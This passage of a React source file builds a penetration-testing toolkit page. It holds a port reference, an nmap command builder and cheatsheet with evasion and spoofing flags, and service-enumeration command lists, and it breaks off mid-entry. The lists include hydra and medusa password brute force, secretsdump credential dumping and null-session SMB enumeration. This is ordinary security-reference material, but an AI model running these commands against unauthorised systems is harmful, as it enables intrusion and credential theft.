import { useMemo, useState } from 'react';
import {
  Network,
  Scan,
  BookOpen,
  Target,
  Crosshair,
  Layers,
  Terminal,
  ListOrdered,
  Wrench,
  Zap,
  Server,
} from 'lucide-react';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import { Card } from '../components/ui/Card.jsx';
import { ToolHelp } from '../components/ui/ToolHelp.jsx';
import { VariableBar } from '../components/ui/VariableBar.jsx';
import { useVariables } from '../lib/variables.js';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';

const bgPage = '#141820';
const bgPanel = '#1A1F2E';
const bgCard = '#1E2536';
const textMain = '#E2E8F0';
const textDim = '#94A3B8';
const accent = '#6EE7B7';
const headerIconBg = '#38BDF8';
const border = 'rgba(110, 231, 183, 0.12)';

const PORT_TABLE = [[20, "FTP-DATA", "FTP data channel (active mode transfers)."], [21, "FTP", "File Transfer Protocol control channel."], [22, "SSH", "Secure Shell remote login and tunneling."], [23, "Telnet", "Cleartext remote terminal (legacy)."], [25, "SMTP", "Simple Mail Transfer Protocol."], [53, "DNS", "Domain Name System (TCP/UDP)."], [67, "DHCP server", "Bootstrap / DHCP server."], [68, "DHCP client", "DHCP client."], [69, "TFTP", "Trivial File Transfer Protocol."], [80, "HTTP", "Hypertext Transfer Protocol (web)."], [88, "Kerberos", "Active Directory authentication."], [110, "POP3", "Post Office Protocol v3."], [111, "RPCbind", "ONC RPC portmapper."], [113, "Ident", "Identification protocol."], [123, "NTP", "Network Time Protocol."], [135, "MSRPC", "Microsoft RPC endpoint mapper."], [137, "NetBIOS-ns", "NetBIOS name service."], [138, "NetBIOS-dgm", "NetBIOS datagram."], [139, "NetBIOS-ssn", "NetBIOS session / SMB over NetBIOS."], [143, "IMAP", "Internet Message Access Protocol."], [161, "SNMP", "Simple Network Management Protocol."], [162, "SNMP-Trap", "SNMP traps."], [389, "LDAP", "Lightweight Directory Access Protocol."], [443, "HTTPS", "HTTP over TLS."], [445, "SMB", "Windows file sharing."], [465, "SMTPS", "SMTP over SSL (legacy)."], [514, "Syslog", "Remote logging (UDP)."], [587, "SMTP submission", "Client mail submission."], [636, "LDAPS", "LDAP over TLS."], [993, "IMAPS", "IMAP over TLS."], [995, "POP3S", "POP3 over TLS."], [1433, "MSSQL", "Microsoft SQL Server."], [1521, "Oracle", "Oracle TNS listener."], [1723, "PPTP", "VPN tunneling (legacy)."], [2049, "NFS", "Network File System."], [2375, "Docker", "Docker API (unencrypted)."], [3306, "MySQL", "MySQL / MariaDB."], [3389, "RDP", "Remote Desktop Protocol."], [5060, "SIP", "VoIP signaling."], [5432, "PostgreSQL", "PostgreSQL database."], [5900, "VNC", "Remote framebuffer."], [5985, "WinRM HTTP", "Windows Remote Management."], [5986, "WinRM HTTPS", "WinRM over TLS."], [6379, "Redis", "In-memory datastore."], [6443, "Kubernetes API", "k8s API (common)."], [8080, "HTTP-Proxy", "Alt HTTP / proxies / Tomcat / Jenkins."], [8443, "HTTPS-Alt", "Alternate HTTPS."], [8888, "HTTP-Alt", "Jupyter / dev stacks."], [9090, "Prometheus", "Metrics HTTP API."], [9200, "Elasticsearch", "Search HTTP API."], [11211, "Memcached", "Distributed cache."], [27017, "MongoDB", "MongoDB wire protocol."], [500, "ISAKMP", "IKE / IPsec (UDP)."], [1194, "OpenVPN", "OpenVPN default (UDP)."], [3128, "Squid", "HTTP proxy."], [5000, "UPnP / dev", "Flask, UPnP, misc HTTP."]];

function buildPortArg(preset, customRange) {
  switch (preset) {
    case 'top100':
      return { arg: '-F', label: 'Top 100 (-F)' };
    case 'top1000':
      return { arg: '--top-ports 1000', label: 'Top 1000' };
    case 'full':
      return { arg: '-p-', label: 'All TCP (-p-)' };
    default:
      return { arg: `-p ${(customRange || '1-1024').trim()}`, label: (customRange || '1-1024').trim() };
  }
}

function buildNmapCommand(target, scanType, portArg) {
  const t = (target || '').trim() || 'TARGET';
  const p = portArg.arg;
  let flags = '';
  switch (scanType) {
    case 'syn':
      flags = `-sS ${p}`;
      break;
    case 'udp':
      flags = `-sU ${p}`;
      break;
    case 'service':
      flags = `-sV -sC ${p}`;
      break;
    default:
      flags = `-sT ${p}`;
      break;
  }
  return `nmap ${flags} ${t}`.replace(/\s+/g, ' ').trim();
}

const TABS = [
  { id: 'scanner', label: 'Port Scanner', Icon: Crosshair },
  { id: 'cheat', label: 'Nmap Cheatsheet', Icon: BookOpen },
  { id: 'enum', label: 'Service Enumeration', Icon: Server },
  { id: 'tools', label: 'Network Tools', Icon: Wrench },
  { id: 'quick', label: 'Quick Scans', Icon: Zap },
];

function inputStyle() {
  return {
    width: '100%',
    boxSizing: 'border-box',
    padding: '10px 12px',
    borderRadius: 8,
    border: `1px solid ${border}`,
    background: '#0f1419',
    color: textMain,
    fontFamily: mono,
    fontSize: 13,
    outline: 'none',
  };
}

function labelStyle() {
  return {
    display: 'block',
    fontSize: 11,
    fontWeight: 600,
    color: textDim,
    marginBottom: 6,
    fontFamily: heading,
    letterSpacing: '0.02em',
  };
}

const NMAP_SECTIONS = [{"title": "Host Discovery", "items": [{"cmd": "-sn", "desc": "Ping scan only; no port scan.", "ex": "nmap -sn 192.168.1.0/24"}, {"cmd": "-Pn", "desc": "Skip host discovery; assume host up.", "ex": "nmap -Pn 10.0.0.5"}, {"cmd": "-PS<port>", "desc": "TCP SYN ping (default 80).", "ex": "nmap -PS22 192.168.1.1"}, {"cmd": "-PS", "desc": "TCP SYN ping default ports.", "ex": "nmap -PS 10.0.0.0/24"}, {"cmd": "-PA<port>", "desc": "TCP ACK ping.", "ex": "nmap -PA80 10.0.0.1"}, {"cmd": "-PA", "desc": "TCP ACK ping default.", "ex": "nmap -PA 192.168.1.0/24"}, {"cmd": "-PU<port>", "desc": "UDP ping on port.", "ex": "nmap -PU40125 192.168.1.1"}, {"cmd": "-PU53", "desc": "UDP ping DNS port.", "ex": "nmap -PU53 10.0.0.1"}, {"cmd": "-PE", "desc": "ICMP echo request.", "ex": "nmap -PE 192.168.1.1"}, {"cmd": "-PP", "desc": "ICMP timestamp request.", "ex": "nmap -PP 192.168.1.1"}, {"cmd": "-PM", "desc": "ICMP address mask request.", "ex": "nmap -PM 192.168.1.1"}, {"cmd": "-PR", "desc": "ARP ping (local Ethernet).", "ex": "nmap -PR 192.168.1.0/24"}, {"cmd": "--disable-arp-ping", "desc": "Never use ARP ping.", "ex": "nmap --disable-arp-ping 10.0.0.1"}, {"cmd": "--traceroute", "desc": "Trace hop path to each host.", "ex": "nmap --traceroute scanme.nmap.org"}, {"cmd": "-sL", "desc": "List scan (DNS reverse on targets).", "ex": "nmap -sL 192.168.1.0/24"}, {"cmd": "-n", "desc": "Never resolve DNS.", "ex": "nmap -n 10.0.0.5"}, {"cmd": "-R", "desc": "Always resolve DNS.", "ex": "nmap -R scanme.nmap.org"}, {"cmd": "--dns-servers", "desc": "Use specific DNS servers.", "ex": "nmap --dns-servers 8.8.8.8 target.com"}, {"cmd": "--system-dns", "desc": "Use OS resolver.", "ex": "nmap --system-dns target.com"}, {"cmd": "--resolve-all", "desc": "Scan every A/AAAA record.", "ex": "nmap --resolve-all example.com"}, {"cmd": "-6", "desc": "Enable IPv6 scanning.", "ex": "nmap -6 -sn 2001:db8::/64"}, {"cmd": "--unprivileged", "desc": "Assume non-root (connect scan).", "ex": "nmap --unprivileged -p 80 10.0.0.1"}, {"cmd": "--send-eth", "desc": "Raw Ethernet frames (layer 2).", "ex": "nmap --send-eth 192.168.1.0/24"}, {"cmd": "--send-ip", "desc": "Raw IP packets.", "ex": "nmap --send-ip 10.0.0.1"}, {"cmd": "--packet-trace", "desc": "Show all packets sent/received.", "ex": "nmap --packet-trace -sn 10.0.0.1"}, {"cmd": "--iflist", "desc": "Print interfaces and routes; exit.", "ex": "nmap --iflist"}, {"cmd": "-e <iface>", "desc": "Use specific network interface.", "ex": "nmap -e eth0 192.168.1.0/24"}, {"cmd": "-S <IP>", "desc": "Spoof source address (advanced).", "ex": "nmap -S 192.168.1.99 10.0.0.1"}, {"cmd": "--source-port <p>", "desc": "Fixed source port for probes.", "ex": "nmap --source-port 53 -Pn 10.0.0.1"}, {"cmd": "--data-length <n>", "desc": "Append random payload bytes.", "ex": "nmap --data-length 32 -sn 10.0.0.1"}, {"cmd": "--ttl <n>", "desc": "Set IPv4 TTL on packets.", "ex": "nmap --ttl 64 10.0.0.1"}, {"cmd": "--badsum", "desc": "Send invalid checksums (test stacks).", "ex": "nmap --badsum 10.0.0.1"}]}, {"title": "Scan Techniques", "items": [{"cmd": "-sS", "desc": "TCP SYN scan (stealth; needs root).", "ex": "nmap -sS -p 1-1000 10.0.0.1"}, {"cmd": "-sT", "desc": "TCP connect scan (full handshake).", "ex": "nmap -sT -p 22,80 10.0.0.1"}, {"cmd": "-sU", "desc": "UDP scan (slow; specify -p).", "ex": "nmap -sU -p 53,161 10.0.0.1"}, {"cmd": "-sA", "desc": "TCP ACK scan (firewall mapping).", "ex": "nmap -sA 10.0.0.1"}, {"cmd": "-sW", "desc": "TCP window scan.", "ex": "nmap -sW 10.0.0.1"}, {"cmd": "-sM", "desc": "TCP Maimon scan (FIN/ACK).", "ex": "nmap -sM 10.0.0.1"}, {"cmd": "-sN", "desc": "TCP null scan (no flags).", "ex": "nmap -sN 10.0.0.1"}, {"cmd": "-sF", "desc": "TCP FIN scan.", "ex": "nmap -sF 10.0.0.1"}, {"cmd": "-sX", "desc": "Xmas scan (FIN+PSH+URG).", "ex": "nmap -sX 10.0.0.1"}, {"cmd": "-sI <zombie>", "desc": "Idle scan via zombie host.", "ex": "nmap -sI zombie:port 10.0.0.1"}, {"cmd": "-b <FTP>", "desc": "FTP bounce scan (rare).", "ex": "nmap -b user:pass@ftp:21 10.0.0.1"}, {"cmd": "--scanflags <flags>", "desc": "Custom TCP flags string.", "ex": "nmap --scanflags SYNFIN 10.0.0.1"}, {"cmd": "-sY", "desc": "SCTP INIT scan.", "ex": "nmap -sY -p 38412 10.0.0.1"}, {"cmd": "-sZ", "desc": "SCTP COOKIE-ECHO scan.", "ex": "nmap -sZ -p 38412 10.0.0.1"}, {"cmd": "-sO", "desc": "IP protocol scan.", "ex": "nmap -sO 10.0.0.1"}, {"cmd": "--ip-options <hex>", "desc": "Set IPv4 options field.", "ex": "nmap --ip-options \"R\" 10.0.0.1"}, {"cmd": "--min-parallelism", "desc": "Minimum parallel probes.", "ex": "nmap --min-parallelism 10 -p- 10.0.0.1"}, {"cmd": "--max-parallelism", "desc": "Cap parallel probes.", "ex": "nmap --max-parallelism 50 10.0.0.1"}, {"cmd": "--scan-delay", "desc": "Delay between probes to host.", "ex": "nmap --scan-delay 2s 10.0.0.1"}, {"cmd": "--max-scan-delay", "desc": "Max delay between probes.", "ex": "nmap --max-scan-delay 10s 10.0.0.1"}, {"cmd": "--host-timeout", "desc": "Give up host after duration.", "ex": "nmap --host-timeout 30m 10.0.0.0/24"}, {"cmd": "--initial-rtt-timeout", "desc": "Initial probe RTT guess.", "ex": "nmap --initial-rtt-timeout 500ms 10.0.0.1"}]}, {"title": "Port Specification", "items": [{"cmd": "-p <ports>", "desc": "Port list, ranges, U:T mix.", "ex": "nmap -p 22,80,443,1000-2000 10.0.0.1"}, {"cmd": "-p-", "desc": "All 65535 TCP ports.", "ex": "nmap -p- 10.0.0.1"}, {"cmd": "-p U:53,161", "desc": "UDP ports explicitly.", "ex": "nmap -sU -p U:53,161 10.0.0.1"}, {"cmd": "--top-ports <n>", "desc": "N most common ports.", "ex": "nmap --top-ports 200 10.0.0.1"}, {"cmd": "-F", "desc": "Fast: top 100 ports.", "ex": "nmap -F 10.0.0.1"}, {"cmd": "-r", "desc": "Scan ports in order (no random).", "ex": "nmap -r -p 1-1024 10.0.0.1"}, {"cmd": "--port-ratio <r>", "desc": "Ports more common than ratio.", "ex": "nmap --port-ratio 0.2 10.0.0.1"}, {"cmd": "--exclude-ports", "desc": "Exclude port list from scan.", "ex": "nmap -p- --exclude-ports 9100 10.0.0.1"}, {"cmd": "--exclude <host>", "desc": "Exclude hosts/CIDR.", "ex": "nmap 192.168.1.0/24 --exclude 192.168.1.5"}, {"cmd": "--excludefile <file>", "desc": "Exclude hosts from file.", "ex": "nmap -iL hosts.txt --excludefile skip.txt"}, {"cmd": "-iL <file>", "desc": "Input target list from file.", "ex": "nmap -iL targets.txt"}, {"cmd": "-iR <n>", "desc": "Random internet hosts (careful).", "ex": "nmap -iR 10 -p 80"}, {"cmd": "--resume <file>", "desc": "Resume aborted scan (grepable).", "ex": "nmap --resume scan.gnmap"}, {"cmd": "-g / --source-port", "desc": "Alias for source port (evasion).", "ex": "nmap -g 53 -p 80 10.0.0.1"}, {"cmd": "--randomize-hosts", "desc": "Randomize target order.", "ex": "nmap --randomize-hosts -iL subnets.txt"}]}, {"title": "Service / Version Detection", "items": [{"cmd": "-sV", "desc": "Version detection on open ports.", "ex": "nmap -sV -p 22,80 10.0.0.1"}, {"cmd": "--version-intensity <0-9>", "desc": "Probe intensity (default 7).", "ex": "nmap -sV --version-intensity 9 10.0.0.1"}, {"cmd": "--version-light", "desc": "Light probes (intensity 2).", "ex": "nmap -sV --version-light 10.0.0.1"}, {"cmd": "--version-all", "desc": "Try every probe (intensity 9).", "ex": "nmap -sV --version-all 10.0.0.1"}, {"cmd": "--version-trace", "desc": "Show version scan activity.", "ex": "nmap -sV --version-trace 10.0.0.1"}, {"cmd": "-A", "desc": "Aggressive: OS, version, script, traceroute.", "ex": "nmap -A 10.0.0.1"}, {"cmd": "-sC", "desc": "Default NSE scripts (with -sV often).", "ex": "nmap -sC -sV 10.0.0.1"}, {"cmd": "--script", "desc": "Run script(s) or categories.", "ex": "nmap --script=http-title -p 80 10.0.0.1"}, {"cmd": "--script-args", "desc": "Key=value args for scripts.", "ex": "nmap --script smb-enum-shares --script-args smbusername=guest 10.0.0.1"}, {"cmd": "--script-args-file", "desc": "Load script args from file.", "ex": "nmap --script-args-file args.txt 10.0.0.1"}, {"cmd": "--script-trace", "desc": "Trace script execution.", "ex": "nmap --script-trace --script=default 10.0.0.1"}, {"cmd": "--script-updatedb", "desc": "Update script database.", "ex": "nmap --script-updatedb"}, {"cmd": "--script-help <script>", "desc": "Show script help.", "ex": "nmap --script-help smb-enum-users"}, {"cmd": "--script-timeout", "desc": "Max time per script.", "ex": "nmap --script-timeout 2m --script=vuln 10.0.0.1"}, {"cmd": "--datadir", "desc": "Custom NSE data directory.", "ex": "nmap --datadir /opt/nmap/share/nmap 10.0.0.1"}]}, {"title": "OS Detection", "items": [{"cmd": "-O", "desc": "Enable OS detection.", "ex": "nmap -O 10.0.0.1"}, {"cmd": "--osscan-limit", "desc": "Only guess OS for good candidates.", "ex": "nmap -O --osscan-limit 10.0.0.1"}, {"cmd": "--osscan-guess / --fuzzy", "desc": "Aggressive guess if fingerprint weak.", "ex": "nmap -O --osscan-guess 10.0.0.1"}, {"cmd": "--max-os-tries", "desc": "Set OS detection attempts.", "ex": "nmap -O --max-os-tries 2 10.0.0.1"}, {"cmd": "-A", "desc": "Includes -O among other things.", "ex": "nmap -A 10.0.0.1"}, {"cmd": "--hostmap", "desc": "Persist/learn hostnames (grepable).", "ex": "nmap --hostmap hostmap.txt 10.0.0.1"}, {"cmd": "--min-hostgroup", "desc": "Minimum hosts parallelized.", "ex": "nmap --min-hostgroup 64 10.0.0.0/16"}, {"cmd": "--max-hostgroup", "desc": "Maximum hosts parallelized.", "ex": "nmap --max-hostgroup 1024 10.0.0.0/8"}, {"cmd": "--min-parallelism", "desc": "Min outstanding probes globally.", "ex": "nmap --min-parallelism 50 10.0.0.0/24"}, {"cmd": "--max-parallelism", "desc": "Max outstanding probes globally.", "ex": "nmap --max-parallelism 100 10.0.0.0/24"}]}, {"title": "Timing & Performance", "items": [{"cmd": "-T0", "desc": "Paranoid timing template.", "ex": "nmap -T0 10.0.0.1"}, {"cmd": "-T1", "desc": "Sneaky timing template.", "ex": "nmap -T1 10.0.0.1"}, {"cmd": "-T2", "desc": "Polite timing template.", "ex": "nmap -T2 10.0.0.1"}, {"cmd": "-T3", "desc": "Normal (default) timing.", "ex": "nmap -T3 10.0.0.1"}, {"cmd": "-T4", "desc": "Aggressive timing.", "ex": "nmap -T4 10.0.0.1"}, {"cmd": "-T5", "desc": "Insane timing.", "ex": "nmap -T5 10.0.0.1"}, {"cmd": "--min-rate <n>", "desc": "Minimum packets per second.", "ex": "nmap --min-rate 300 10.0.0.1"}, {"cmd": "--max-rate <n>", "desc": "Maximum packets per second.", "ex": "nmap --max-rate 1000 10.0.0.1"}, {"cmd": "--defeat-rst-ratelimit", "desc": "Ignore rate-limited RST (Linux).", "ex": "nmap --defeat-rst-ratelimit -p- 10.0.0.1"}, {"cmd": "--defeat-icmp-ratelimit", "desc": "Slow scan when ICMP limited.", "ex": "nmap --defeat-icmp-ratelimit 10.0.0.1"}, {"cmd": "--max-retries", "desc": "Cap port scan retransmissions.", "ex": "nmap --max-retries 2 10.0.0.1"}, {"cmd": "--stats-every <t>", "desc": "Periodic status updates.", "ex": "nmap --stats-every 10s 10.0.0.1"}, {"cmd": "--nsock-engine", "desc": "Select IO engine (epoll/kqueue/poll).", "ex": "nmap --nsock-engine epoll 10.0.0.1"}, {"cmd": "--min-rtt-timeout", "desc": "Minimum probe RTT timeout.", "ex": "nmap --min-rtt-timeout 100ms 10.0.0.1"}, {"cmd": "--max-rtt-timeout", "desc": "Maximum probe RTT timeout.", "ex": "nmap --max-rtt-timeout 10s 10.0.0.1"}]}, {"title": "NSE Scripts", "items": [{"cmd": "--script=vuln", "desc": "Run all scripts in vuln category.", "ex": "nmap --script=vuln -p80,443 10.0.0.1"}, {"cmd": "--script=discovery", "desc": "Non-intrusive discovery scripts.", "ex": "nmap --script=discovery 10.0.0.1"}, {"cmd": "--script=safe", "desc": "Scripts unlikely to crash services.", "ex": "nmap --script=safe 10.0.0.1"}, {"cmd": "--script=default", "desc": "Default script set.", "ex": "nmap -sC 10.0.0.1"}, {"cmd": "--script=auth", "desc": "Authentication-related scripts.", "ex": "nmap --script=auth 10.0.0.1"}, {"cmd": "--script=brute", "desc": "Brute-force scripts (intrusive).", "ex": "nmap --script=brute 10.0.0.1"}, {"cmd": "--script=exploit", "desc": "Exploit scripts (very intrusive).", "ex": "nmap --script=exploit 10.0.0.1"}, {"cmd": "--script=malware", "desc": "Malware detection scripts.", "ex": "nmap --script=malware 10.0.0.1"}, {"cmd": "--script=http-enum", "desc": "Web path enumeration.", "ex": "nmap --script=http-enum -p80 10.0.0.1"}, {"cmd": "--script=smb-enum-shares", "desc": "List SMB shares.", "ex": "nmap --script=smb-enum-shares -p445 10.0.0.1"}, {"cmd": "--script=smb-enum-users", "desc": "Enumerate SMB users.", "ex": "nmap --script=smb-enum-users -p445 10.0.0.1"}, {"cmd": "--script=ssl-enum-ciphers", "desc": "TLS cipher enumeration.", "ex": "nmap --script=ssl-enum-ciphers -p443 10.0.0.1"}, {"cmd": "--script=dns-brute", "desc": "DNS hostname brute force.", "ex": "nmap --script=dns-brute 10.0.0.1"}, {"cmd": "--script=ftp-anon", "desc": "Check anonymous FTP.", "ex": "nmap --script=ftp-anon -p21 10.0.0.1"}, {"cmd": "--script=ssh-auth-methods", "desc": "List SSH auth methods.", "ex": "nmap --script=ssh-auth-methods -p22 10.0.0.1"}, {"cmd": "--script=snmp-brute", "desc": "SNMP community brute.", "ex": "nmap --script=snmp-brute -sU -p161 10.0.0.1"}, {"cmd": "--script=mysql-info", "desc": "MySQL information.", "ex": "nmap --script=mysql-info -p3306 10.0.0.1"}, {"cmd": "--script=rdp-enum-encryption", "desc": "RDP security settings.", "ex": "nmap --script=rdp-enum-encryption -p3389 10.0.0.1"}, {"cmd": "--script=whois-ip", "desc": "WHOIS IP lookup.", "ex": "nmap --script=whois-ip 10.0.0.1"}, {"cmd": "--script \"default and safe\"", "desc": "Boolean expression of categories.", "ex": "nmap --script \"default and safe\" 10.0.0.1"}, {"cmd": "--script-timeout", "desc": "Per-script max runtime.", "ex": "nmap --script-timeout 3m --script=vuln 10.0.0.1"}]}, {"title": "Output", "items": [{"cmd": "-oN <file>", "desc": "Normal human-readable output.", "ex": "nmap -oN scan.txt 10.0.0.1"}, {"cmd": "-oX <file>", "desc": "XML output.", "ex": "nmap -oX scan.xml 10.0.0.1"}, {"cmd": "-oG <file>", "desc": "Grepable output.", "ex": "nmap -oG scan.gnmap 10.0.0.1"}, {"cmd": "-oS <file>", "desc": "Script kiddie (humorous) format.", "ex": "nmap -oS l33t.txt 10.0.0.1"}, {"cmd": "-oA <base>", "desc": "All major formats (N, X, G).", "ex": "nmap -oA scan 10.0.0.1"}, {"cmd": "--open", "desc": "Show only open (or open|filtered) ports.", "ex": "nmap --open -p- 10.0.0.1"}, {"cmd": "-v", "desc": "Verbose level 1.", "ex": "nmap -v 10.0.0.1"}, {"cmd": "-vv", "desc": "Extra verbose.", "ex": "nmap -vv 10.0.0.1"}, {"cmd": "-d", "desc": "Debug (repeat for more).", "ex": "nmap -d 10.0.0.1"}, {"cmd": "--reason", "desc": "Show reason for port state.", "ex": "nmap --reason -p 22 10.0.0.1"}, {"cmd": "--packet-trace", "desc": "Packet-level trace to stdout.", "ex": "nmap --packet-trace -p 80 10.0.0.1"}, {"cmd": "--iflist", "desc": "List interfaces (diagnostic).", "ex": "nmap --iflist"}]}, {"title": "Firewall Evasion", "items": [{"cmd": "-f", "desc": "Fragment IP packets.", "ex": "nmap -f 10.0.0.1"}, {"cmd": "--mtu <n>", "desc": "Use given MTU (implies frag).", "ex": "nmap --mtu 16 10.0.0.1"}, {"cmd": "-D RND:10,ME", "desc": "Decoy scan with random decoys.", "ex": "nmap -D RND:10,ME 10.0.0.1"}, {"cmd": "-S <IP>", "desc": "Spoof source IP.", "ex": "nmap -S 192.168.1.50 10.0.0.1"}, {"cmd": "--source-port <p>", "desc": "Spoof source port.", "ex": "nmap --source-port 53 -p 80 10.0.0.1"}, {"cmd": "-g <p>", "desc": "Same as --source-port.", "ex": "nmap -g 53 10.0.0.1"}, {"cmd": "--data-length <n>", "desc": "Append random data to probes.", "ex": "nmap --data-length 24 10.0.0.1"}, {"cmd": "--ttl <n>", "desc": "Set IPv4 TTL.", "ex": "nmap --ttl 128 10.0.0.1"}, {"cmd": "--badsum", "desc": "Send packets with bad checksums.", "ex": "nmap --badsum 10.0.0.1"}, {"cmd": "--ip-options", "desc": "Loose/strict source route etc.", "ex": "nmap --ip-options \"R\" 10.0.0.1"}, {"cmd": "--spoof-mac <vendor|0|random>", "desc": "Spoof MAC address.", "ex": "nmap --spoof-mac Apple 10.0.0.1"}, {"cmd": "--proxies <url,...>", "desc": "Relay TCP via HTTP/SOCKS4/SOCKS5.", "ex": "nmap --proxies http://127.0.0.1:8080 10.0.0.1"}, {"cmd": "--data-string <str>", "desc": "Append custom string to packets.", "ex": "nmap --data-string \"GET /\" -p80 10.0.0.1"}, {"cmd": "--adler32", "desc": "Use Adler32 instead of CRC32C (SCTP).", "ex": "nmap -sY --adler32 -p 38412 10.0.0.1"}, {"cmd": "--scan-delay", "desc": "Slow probes (IDS evasion).", "ex": "nmap --scan-delay 1s 10.0.0.1"}]}];
const SERVICE_ENUM = [{"name": "FTP", "rows": [["ftp client", "Interactive FTP session.", "ftp 10.0.0.1"], ["anonymous", "Try anonymous:anonymous.", "ftp 10.0.0.1"], ["banner (nc)", "Grab FTP banner.", "nc -vn 10.0.0.1 21"], ["curl FTPS", "Test explicit TLS FTP.", "curl -vk ftps://10.0.0.1"], ["nmap ftp scripts", "NSE FTP checks.", "nmap --script=ftp-anon,ftp-bounce -p21 10.0.0.1"], ["hydra", "FTP password spray.", "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.1"], ["medusa", "Alternate FTP brute.", "medusa -h 10.0.0.1 -u admin -P pass.txt -M ftp"], ["nmap bounce", "FTP bounce scan test.", "nmap -b user:pass@10.0.0.1:21 10.0.0.2"], ["wget mirror", "Mirror if anonymous allowed.", "wget -m ftp://anonymous:anonymous@10.0.0.1/"], ["lftp", "Batch FTP / mirror.", "lftp ftp://10.0.0.1"], ["searchsploit", "Match version to local exploits.", "searchsploit pure-ftpd"]]}, {"name": "SSH", "rows": [["banner", "SSH version string.", "nc -vn 10.0.0.1 22"], ["ssh-keyscan", "Collect host keys.", "ssh-keyscan 10.0.0.1"], ["ssh-audit", "Weak algorithms audit.", "ssh-audit 10.0.0.1"], ["hydra ssh", "SSH brute force.", "hydra -L users.txt -P pass.txt ssh://10.0.0.1"], ["medusa ssh", "SSH brute.", "medusa -h 10.0.0.1 -U users.txt -P pass.txt -M ssh"], ["nmap ssh-auth-methods", "List auth methods.", "nmap --script ssh-auth-methods -p22 10.0.0.1"], ["nmap ssh-hostkey", "Grab hostkey.", "nmap --script ssh-hostkey -p22 10.0.0.1"], ["nmap ssh2-enum-algos", "Enumerate algorithms.", "nmap --script ssh2-enum-algos -p22 10.0.0.1"], ["patator", "Username oracle (tune ignore).", "patator ssh_login host=10.0.0.1 user=FILE0 password=x 0=users.txt"], ["masscan", "Fast port then banner.", "masscan 10.0.0.1 -p22 --rate=1000"]]}, {"name": "SMB", "rows": [["smbclient -L", "Null session share list.", "smbclient -L //10.0.0.1 -N"], ["smbclient share", "Connect to share.", "smbclient //10.0.0.1/SHARE -U user%pass"], ["smbmap", "Share permissions map.", "smbmap -H 10.0.0.1"], ["crackmapexec", "Auth / enumerate / exec.", "crackmapexec smb 10.0.0.1"], ["enum4linux", "Classic SMB enum.", "enum4linux -a 10.0.0.1"], ["rpcclient null", "RPC null session.", "rpcclient -U \"\" -N 10.0.0.1"], ["rpcclient users", "List domain users if allowed.", "rpcclient -U \"\" -N 10.0.0.1 -c enumdomusers"], ["nmap smb-enum-shares", "NSE share enum.", "nmap --script smb-enum-shares -p445 10.0.0.1"], ["nmap smb-enum-users", "NSE user enum.", "nmap --script smb-enum-users -p445 10.0.0.1"], ["nmap smb-os-discovery", "OS via SMB.", "nmap --script smb-os-discovery -p445 10.0.0.1"], ["nmap ms17-010", "EternalBlue-style check.", "nmap --script smb-vuln-ms17-010 -p445 10.0.0.1"], ["lookupsid", "SID / users (impacket).", "lookupsid.py guest@10.0.0.1"], ["secretsdump", "DCSync style (needs creds).", "secretsdump.py domain/user:pass@10.0.0.1"], ["smbget", "Recursive download.", "smbget -R smb://user:pass@10.0.0.1/share"], ["showmount", "NFS exports (adjacent).", "showmount -e 10.0.0.1"]]}, {"name": "HTTP", "rows": [["curl -I", "Response headers.", "curl -sI http://10.0.0.1"], ["gobuster", "Directory brute.", "gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt"], ["ffuf", "Fast web fuzz.", "ffuf -u http://10.0.0.1/FUZZ -w wordlist.txt"], ["nikto", "Web server scan.", "nikto -h http://10.0.0.1"], ["whatweb", "Tech fingerprint.", "whatweb http://10.0.0.1"], ["wfuzz", "Parameter fuzzing.", "wfuzz -c -z file,wordlist.txt http://10.0.0.1?id=FUZZ"], ["dirsearch", "Python dir brute.", "dirsearch -u http://10.0.0.1"], ["feroxbuster", "Recursive discovery.", "feroxbuster -u http://10.0.0.1 -w wordlist.txt"], ["httpx", "Probe many hosts.", "httpx -l hosts.txt -title -tech-detect"], ["curl POST", "Test login form.", "curl -d \"user=admin&pass=test\" http://10.0.0.1/login"], ["nmap http-enum", "NSE path enum.", "nmap --script http-enum -p80 10.0.0.1"], ["nmap http-methods", "HTTP methods.", "nmap --script http-methods -p80 10.0.0.1"], ["nmap ssl-enum-ciphers", "HTTPS ciphers.", "nmap --script ssl-enum-ciphers -p443 10.0.0.1"], ["wpscan", "WordPress audit.", "wpscan --url http://10.0.0.1"], ["arjun", "Hidden HTTP params.", "arjun -u http://10.0.0.1/api"]]}, {"name": "DNS", "rows": [["dig A", "Resolve A record.", "dig +short A example.com @8.8.8.8"], ["dig AXFR", "Zone transfer attempt.", "dig axfr @ns1.example.com example.com"], ["nslookup", "Basic lookup.", "nslookup example.com 8.8.8.8"], ["dnsrecon", "DNS reconnaissance.", "dnsrecon -d example.com"], ["dnsenum", "Enumerate DNS.", "dnsenum example.com"], ["fierce", "Subdomain brute.", "fierce --domain example.com"], ["host -l", "Zone transfer via host.", "host -l example.com ns1.example.com"], ["dig ANY", "ANY query (often blocked).", "dig +noall +answer ANY example.com"], ["dig TXT", "SPF / DMARC.", "dig TXT _dmarc.example.com"], ["nmap dns-brute", "NSE DNS brute.", "nmap --script dns-brute --script-args dns-brute.domain=example.com"]]}, {"name": "SMTP", "rows": [["nc banner", "SMTP banner.", "nc -vn 10.0.0.1 25"], ["VRFY", "Verify user (if allowed).", "echo VRFY root | nc 10.0.0.1 25"], ["EXPN", "Expand list (if allowed).", "echo EXPN all | nc 10.0.0.1 25"], ["swaks RCPT", "User existence via RCPT.", "swaks --to user@dom.com --server 10.0.0.1"], ["swaks send", "Send test mail.", "swaks --to test@test.com --from a@test.com --server 10.0.0.1"], ["nmap smtp-commands", "Enumerate SMTP commands.", "nmap --script smtp-commands -p25 10.0.0.1"], ["nmap smtp-open-relay", "Open relay test.", "nmap --script smtp-open-relay -p25 10.0.0.1"], ["nmap smtp-enum-users", "SMTP user enum.", "nmap --script smtp-enum-users -p25 10.0.0.1"], ["msf smtp_enum", "MSF SMTP user enum.", "msfconsole -q -x \"use auxiliary/scanner/smtp/smtp_enum; set RHOSTS 10.0.0.1; run\""], ["openssl s_client", "SMTPS handshake.", "openssl s_client -connect 10.0.0.1:465 -crlf"]]}, {"name": "SNMP", "rows": [["snmpwalk v2c", "Walk with community.", "snmpwalk -v2c -c public 10.0.0.1"], ["snmpwalk v1", "SNMPv1 walk.", "snmpwalk -v1 -c public 10.0.0.1"], ["snmp-check", "Kali SNMP 